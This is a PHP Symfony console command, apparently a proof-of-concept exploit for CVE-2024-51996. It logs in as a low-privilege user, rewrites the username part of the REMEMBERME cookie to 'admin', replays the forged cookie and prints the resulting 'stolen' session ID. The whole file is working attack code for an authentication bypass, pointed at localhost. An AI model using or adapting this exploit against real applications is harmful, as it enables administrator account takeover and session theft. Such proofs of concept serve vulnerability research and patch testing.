<?php

namespace App\Command;

use Symfony\Component\BrowserKit\HttpBrowser;
use Symfony\Component\Console\Attribute\AsCommand;
use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;
use Symfony\Contracts\HttpClient\HttpClientInterface;

#[AsCommand(name: 'exploit:CVE-2024-51996')]
class ExploitCVE202451996Command extends Command
{
    private static string $cookieDelimiter = ':';
    private static string $targetUser = 'admin';
    private static string $cookieName = 'REMEMBERME';

    public function __construct(private readonly HttpClientInterface $httpClient)
    {
        parent::__construct();
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $client = new HttpBrowser($this->httpClient);
        $client->request('POST', 'https://localhost:8000/login', [
            '_username' => 'user',
            '_password' => 'user',
            '_remember_me' => 'on',
        ]);

        $cookieJar = $client->getCookieJar();
        $rememberMeCookie = $cookieJar->get(self::$cookieName)->getValue();

        $cookieInfo = explode(self::$cookieDelimiter, $rememberMeCookie);
        $cookieInfo[1] = str_replace('=', '~', base64_encode(self::$targetUser));
        $alteredCookie = implode(self::$cookieDelimiter, $cookieInfo);

        $response = $this->httpClient->request('GET', 'https://localhost:8000/who-am-i', [
            'headers' => [
                'Cookie' => sprintf('%s=%s', self::$cookieName, $alteredCookie),
            ],
        ]);

        $output->writeln(sprintf('<info>Stolen PHPSESSID : %s</info>', explode(';', $response->getHeaders()['set-cookie'][0])[0]));

        return Command::SUCCESS;
    }
}